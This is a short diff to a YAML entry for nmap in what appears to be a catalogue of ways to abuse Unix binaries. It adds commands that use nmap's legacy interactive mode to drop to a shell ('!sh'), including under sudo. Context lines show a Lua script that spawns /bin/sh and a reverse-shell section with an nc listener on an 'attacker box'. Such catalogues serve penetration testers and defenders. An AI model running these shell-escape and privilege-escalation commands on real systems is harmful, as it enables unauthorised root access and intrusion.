@@ -6,6 +6,10 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         nmap --script=$TF
+    - description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+      code: |
+        nmap --interactive
+        nmap> !sh
   non-interactive-reverse-shell:
     - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell.
       code: |
@@ -82,6 +86,10 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         sudo nmap --script=$TF
+    - description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+      code: |
+        sudo nmap --interactive
+        nmap> !sh
   limited-suid:
     - description: Input echo is disabled.
       code: |
